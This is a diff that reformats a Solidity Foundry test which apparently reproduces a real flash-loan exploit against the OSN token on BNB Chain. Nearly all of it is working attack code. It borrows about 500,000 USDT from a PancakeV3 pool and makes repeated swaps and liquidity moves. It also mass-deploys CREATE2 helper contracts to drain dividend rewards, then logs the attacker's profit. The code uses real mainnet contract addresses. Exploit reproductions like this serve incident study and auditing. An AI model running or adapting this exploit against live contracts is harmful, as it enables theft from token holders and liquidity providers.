@@ -23,18 +23,18 @@ import {IWBNB} from "src/interfaces/IWBNB.sol";
 // TX2:help contract add Liq : https://app.blocksec.com/explorer/tx/bsc/0x69c64b226f8bf06216cc665ad5e3777ad1b120909326f120f0816ac65a9099c0
 // TX3:attack tx
 interface Imoney {
+
     function addLiq(uint256 value) external;
     function cc() external;
+
 }
 
 contract ContractTest is Test {
+
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    IUniswapV3Pair pool =
-        IUniswapV3Pair(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
-    IUniswapV2Pair wbnb_atm =
-        IUniswapV2Pair(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
-    IUniswapV2Router router =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+    IUniswapV3Pair pool = IUniswapV3Pair(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
+    IUniswapV2Pair wbnb_atm = IUniswapV2Pair(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
+    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
     IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
@@ -48,19 +48,11 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint(
-            "[Begin] Attacker USDT before exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
         // borrow_amount = 500_000 ether;
         borrow_amount = 500_009_458_043_549_158_462_637;
         pool.flash(address(this), borrow_amount, 0, "");
-        emit log_named_decimal_uint(
-            "[End] Attacker USDT after exploit",
-            USDT.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
     }
 
     function pancakeV3FlashCallback(
@@ -73,62 +65,18 @@ contract ContractTest is Test {
         USDT.approve(address(router), type(uint256).max - 1);
         OSN_PAIR.approve(address(router), type(uint256).max - 1);
         uint256 usdt_balance = USDT.balanceOf(address(this));
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
-        swap_token_to_ExactToken(
-            address(USDT),
-            address(OSN),
-            10_000 ether,
-            usdt_balance
-        );
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+        swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
         usdt_balance = USDT.balanceOf(address(this));
-        uint256 osn_balance = OSN.balanceOf(address(this)) -
-            100 *
-            1_000_000_000_000_000; //use to transfer to contract
+        uint256 osn_balance = OSN.balanceOf(address(this)) - 100 * 1_000_000_000_000_000; //use to transfer to contract
         console.log(usdt_balance, osn_balance);
         router.addLiquidity(
-            address(USDT),
-            address(OSN),
-            usdt_balance,
-            osn_balance,
-            0,
-            0,
-            address(this),
-            block.timestamp
+            address(USDT), address(OSN), usdt_balance, osn_balance, 0, 0, address(this), block.timestamp
         );
         console.log(OSN_PAIR.balanceOf(address(this)));
         uint256 pair_balance = OSN_PAIR.balanceOf(address(this));
@@ -154,28 +102,13 @@ contract ContractTest is Test {
             i++;
         }
         router.removeLiquidity(
-            address(USDT),
-            address(OSN),
-            OSN_PAIR.balanceOf(address(this)),
-            0,
-            0,
-            address(this),
-            block.timestamp
+            address(USDT), address(OSN), OSN_PAIR.balanceOf(address(this)), 0, 0, address(this), block.timestamp
         );
         i = 0;
         while (i < 10) {
             // Activate divided
-            swap_token_to_ExactToken(
-                address(USDT),
-                address(OSN),
-                10_000 ether,
-                usdt_balance
-            );
-            swap_token_to_token(
-                address(OSN),
-                address(USDT),
-                OSN.balanceOf(address(this))
-            );
+            swap_token_to_ExactToken(address(USDT), address(OSN), 10_000 ether, usdt_balance);
+            swap_token_to_token(address(OSN), address(USDT), OSN.balanceOf(address(this)));
             i++;
         }
         i = 0;
@@ -189,41 +122,20 @@ contract ContractTest is Test {
         USDT.transfer(address(pool), borrow_amount + fee0);
     }
 
-    function swap_token_to_ExactToken(
-        address a,
-        address b,
-        uint256 amountout,
-        uint256 amountInMax
-    ) internal {
+    function swap_token_to_ExactToken(address a, address b, uint256 amountout, uint256 amountInMax) internal {
         IERC20(a).approve(address(router), amountInMax);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        router.swapTokensForExactTokens(
-            amountout,
-            amountInMax,
-            path,
-            address(this),
-            block.timestamp
-        );
+        router.swapTokensForExactTokens(amountout, amountInMax, path, address(this), block.timestamp);
     }
 
-    function swap_token_to_token(
-        address a,
-        address b,
-        uint256 amount
-    ) internal {
+    function swap_token_to_token(address a, address b, uint256 amount) internal {
         IERC20(a).approve(address(router), amount);
         address[] memory path = new address[](2);
         path[0] = address(a);
         path[1] = address(b);
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amount,
-            0,
-            path,
-            address(this),
-            block.timestamp
-        );
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount, 0, path, address(this), block.timestamp);
     }
 
     function create_contract(uint256 times) internal {
@@ -232,14 +144,7 @@ contract ContractTest is Test {
             bytes memory bytecode = type(Money).creationCode;
             uint256 _salt = i;
             bytecode = abi.encodePacked(bytecode);
-            bytes32 hash = keccak256(
-                abi.encodePacked(
-                    bytes1(0xff),
-                    address(this),
-                    _salt,
-                    keccak256(bytecode)
-                )
-            );
+            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
             address hack_contract = address(uint160(uint256(hash)));
             // console.log(hack_contract);
             address addr;
@@ -255,22 +160,16 @@ contract ContractTest is Test {
         bytes memory bytecode = type(Money).creationCode;
         uint256 _salt = time;
         bytecode = abi.encodePacked(bytecode);
-        bytes32 hash = keccak256(
-            abi.encodePacked(
-                bytes1(0xff),
-                address(this),
-                _salt,
-                keccak256(bytecode)
-            )
-        );
+        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));
         address hack_contract = address(uint160(uint256(hash)));
         return hack_contract;
     }
+
 }
 
 contract Money {
-    IUniswapV2Router router =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+
+    IUniswapV2Router router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IERC20 OSN = IERC20(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13);
     IERC20 OSN_PAIR = IERC20(0x4EEDdCc7C8714A684311F8b01154B5686A0f612f);
@@ -281,42 +180,17 @@ contract Money {
         OSN_PAIR.approve(address(router), type(uint256).max - 1);
         USDT.approve(address(router), type(uint256).max - 1);
         OSN.approve(address(router), type(uint256).max - 1);
-        router.addLiquidity(
-            address(USDT),
-            address(OSN),
-            100_000,
-            100_000,
-            0,
-            0,
-            address(this),
-            block.timestamp
-        );
+        router.addLiquidity(address(USDT), address(OSN), 100_000, 100_000, 0, 0, address(this), block.timestamp);
     }
 
     function addLiq(uint256 value) public {
-        router.removeLiquidity(
-            address(USDT),
-            address(OSN),
-            35_524,
-            0,
-            0,
-            address(this),
-            block.timestamp
-        );
+        router.removeLiquidity(address(USDT), address(OSN), 35_524, 0, 0, address(this), block.timestamp);
         OSN_PAIR.transfer(address(owner), value);
     }
 
     function cc() public {
-        router.addLiquidity(
-            address(USDT),
-            address(OSN),
-            100_000,
-            100_000,
-            0,
-            0,
-            address(this),
-            block.timestamp
-        );
+        router.addLiquidity(address(USDT), address(OSN), 100_000, 100_000, 0, 0, address(this), block.timestamp);
         USDT.transfer(address(owner), USDT.balanceOf(address(this)));
     }
+
 }
